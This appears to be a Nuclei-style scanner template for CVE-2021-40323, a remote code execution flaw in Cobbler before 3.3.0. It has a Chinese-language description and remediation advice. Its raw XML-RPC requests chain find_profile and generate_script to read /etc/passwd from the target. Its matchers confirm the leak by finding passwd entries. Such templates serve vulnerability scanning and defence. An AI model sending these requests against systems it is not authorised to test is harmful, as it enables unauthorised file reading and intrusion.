id: CVE-2021-40323
info:
  name: Cobbler <3.3.0 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Cobbler 远程代码执行漏洞
    Cobbler是一款网络安装服务器套件，它主要用于快速建立Linux网络安装环境。

    Cobbler 3.3.0 之前的版本存在安全漏洞，该漏洞可以导致远程代码执行。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/cobbler/cobbler/releases

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - text/xml
  - type: regex
    condition: or
    regex:
    - root:.*:0
    - bin:.*:1
    - nobody:.*:99
  extractors:
  - name: profile
    type: regex
    regex:
    - <value><string>(.*?)</string></value>
    group: 1
    internal: true
  matchers-condition: and
  raw:
  - |
    POST {{BaseURL}}/cobbler_api HTTP/1.1
    Host: {{Hostname}}
    Content-Type: text/xml

    <?xml version='1.0'?>
    <methodCall>
      <methodName>find_profile</methodName>
      <params>
        <param>
          <value>
            <struct>
              <member>
                <name>name</name>
                <value>
                  <string>*</string>
                </value>
              </member>
            </struct>
          </value>
        </param>
      </params>
    </methodCall>
  - |
    POST {{BaseURL}}/cobbler_api HTTP/1.1
    Host: {{Hostname}}
    Content-Type: text/xml

    <?xml version='1.0'?>
    <methodCall>
      <methodName>generate_script</methodName>
      <params>
        <param>
          <value>
            <string>{{profile}}</string>
          </value>
        </param>
        <param>
          <value>
            <string></string>
          </value>
        </param>
        <param>
          <value>
            <string>/etc/passwd</string>
          </value>
        </param>
      </params>
    </methodCall>
